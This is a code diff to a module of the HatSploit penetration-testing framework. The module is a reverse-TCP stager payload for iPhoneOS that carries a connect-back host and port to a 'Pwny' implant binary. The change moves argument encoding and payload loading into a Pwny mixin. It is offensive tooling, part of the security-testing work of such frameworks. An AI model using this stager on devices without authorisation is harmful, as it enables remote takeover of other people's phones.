@@ -5,20 +5,14 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-import json
-
 from hatsploit.lib.payload import Payload
-from hatsploit.lib.config import Config
-
-from hatsploit.utils.string import StringTools
 from hatsploit.utils.tcp import TCPClient
 
+from hatsploit.external.pwny.pwny import Pwny
 from hatsploit.external.pwny.session import HatSploitSession
 
 
-class HatSploitPayload(Payload, StringTools):
-    config = Config()
-
+class HatSploitPayload(Payload, Pwny):
     details = {
         'Category': "stager",
         'Name': "iPhoneOS armle Pwny Reverse TCP",
@@ -59,13 +53,7 @@ class HatSploitPayload(Payload, StringTools):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        connback_data = json.dumps({
-            'host': connback_host,
-            'port': connback_port
-        })
+        payload_args = self.encode_args(connback_host, connback_port)
+        self.payload['Args'] = payload_args
 
-        self.payload['Args'] = self.base64_string(connback_data)
-
-        return open(
-            self.config.path_config['data_path'] + 'pwny/pwny.aarch64', 'rb'
-        ).read()
+        return self.get_payload()
